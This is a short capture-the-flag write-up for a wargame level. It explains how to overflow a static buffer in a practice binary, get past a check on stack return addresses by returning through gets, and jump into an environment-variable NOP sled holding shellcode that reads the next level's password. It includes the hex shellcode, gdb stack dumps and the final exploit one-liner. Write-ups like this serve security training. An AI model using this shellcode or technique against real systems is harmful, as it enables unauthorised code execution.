By checking the binary, we can observe that this time the function p is called
properly from the main. We have yet another static buffer that we can overflow.
The trick here is that after the overflow, there is a cmp to check if we're
making the EIP point to an address on the stack (cmp 0xb0000000). In order to
make this exploit work, we first export a shellcode into an environment variable
Shellcode: http://shell-storm.org/shellcode/files/shellcode-216.php.

export SHELLCODE=`python -c 'print "\x90"*100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/level3/.pass;exit;"'`

Then we're pointing the EIP to a function that will be called by the binary, like gets or printf, and just after that we inject the shellcode address. We can find the shellcode address by using the x/ call on ebp.

break main
run
x/1024x $ebp

0xbffff818:0x0036383669057977	0x2f656d6f682f0000
0xbffff828:0x76656c2f72657375	0x6576656c2f326c65
0xbffff838:0x4c4c45485300326c	0x9090903d45444f43
0xbffff848:0x9090909090909090	0x9090909090909090
0xbffff858:0x9090909090909090	0x9090909090909090
0xbffff868:0x9090909090909090	0x9090909090909090
0xbffff878:0x9090909090909090	0x9090909090909090
0xbffff888:0x9090909090909090	0x9090909090909090
0xbffff898:0x9090909090909090	0x9090909090909090
0xbffff8a8:0xc931db3158466a90	0x580b6a5f21eb80cd
0xbffff8b8:0xe689632d68665299	0x2f6868732f2f6852
0xbffff8c8:0x565752e3896e6962	0xffdae880cde18953
0xbffff8d8:0x682f20746163ffff	0x726573752f656d6f
0xbffff8e8:0x2f336c6576656c2f	0x78653b737361702e
0xbffff8f8:0x4c454853003b7469	0x622f6e69622f3d4c
0xbffff908:0x4d52455400687361	0x322d6d726574783d
0xbffff918:0x00726f6c6f633635	0x45494c435f485353

We can see the nopsled begins at 0xbffff848. Better to pick an address in the
middle of the sled as the stack can move a bit in between calls, so we can use
878.

Just need to overflow the buffer with 80 characters, overwrite EIP with the gets
call and pass the nopsled address behing it.

Exploit: python -c 'print "a"*80 + "\xc0\x83\x04\x08" + "\x78\xf8\xff\xbf"' | ./level2
